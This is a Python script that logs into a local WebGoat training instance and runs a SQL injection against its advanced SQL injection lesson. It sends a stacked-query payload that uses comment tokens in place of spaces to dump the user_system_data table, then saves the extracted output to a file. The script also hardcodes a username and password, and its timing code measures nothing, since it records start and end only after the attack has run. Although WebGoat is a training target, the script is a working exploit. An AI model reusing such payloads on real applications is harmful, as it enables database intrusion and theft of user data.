import requests
from datetime import datetime

# Step 1: Import the "requests" module to handle HTTP requests.
# Do NOT use the BeautifulSoup (bs4) library or dict_from_cookiejar from requests.utils library.

# Step 2: Define the base URL and login URL.
base_url = 'http://127.0.0.1:8080/WebGoat/'
login_url = f'{base_url}login'
vulnerable_url = f'{base_url}SqlInjectionAdvanced/attack6a'
session_url = f'{base_url}SqlInjectionAdvanced.lesson.lesson'

# Step 3: Create a session to persist cookies across requests.
with requests.Session() as session:
    # Step 4: Retrieve the login page content.
    response = session.get(login_url)
    
    # Step 5: Define the user credentials.
    username = 'sbombatkar'
    password = 'Sneha#1234'
    
    # Step 6: Submit the login details to authenticate. allow_redirects=True MUST be there.
    data = {
        'username': username,
        'password': password
    }
    response = session.post(login_url, data=data, allow_redirects=True)
    
    # Step 7: Check if the login is successful.
    if "Invalid username and password" not in response.text and response.status_code == 200:
        print("Login successful!")
        
        # Step 8: Access the lesson page to set up the attack.
        lesson_page = session.get(session_url)
        
        # Step 9: Create a payload for the SQL injection attack.
        payload = "cyber';/**/select/**/*/**/from/**/user_system_data;--"
        
        # Step 10: Define the dictionary with the payload.
        attack_data = {
            'userid_6a': payload
        }
        
        # Step 11: Perform the SQL injection attack.
        response = session.post(vulnerable_url, data=attack_data)
        
        # Step 12: Check if the attack was successful by looking for specific keywords in the response.
        response_data = response.json()
        if "lessonCompleted" in response_data and response_data["lessonCompleted"]:
            feedback = response_data["feedback"]
            output = response_data["output"]
            
            # Step 14: Print the feedback and output, indicating the attack was successful.
            print(f'Feedback: {feedback}')
            print(f'Output: {output}')
            
            # Step 15: Save the feedback and output into a file called "extracts.txt".
            with open('extracts.txt', 'w') as f:
                f.write(f"Feedback: {feedback}\n")
                f.write(f"Output: {output}")
            
        # Step 16: Close the session to end the interaction with the server.
    else:
        print("Login failed!")

# Log the start and end time of the script execution.
start_time = datetime.now()
print(f"Start Time: {start_time}")
end_time = datetime.now()
total_time = end_time - start_time
print(f"End Time: {end_time}")
print(f"Total Execution Time: {total_time}")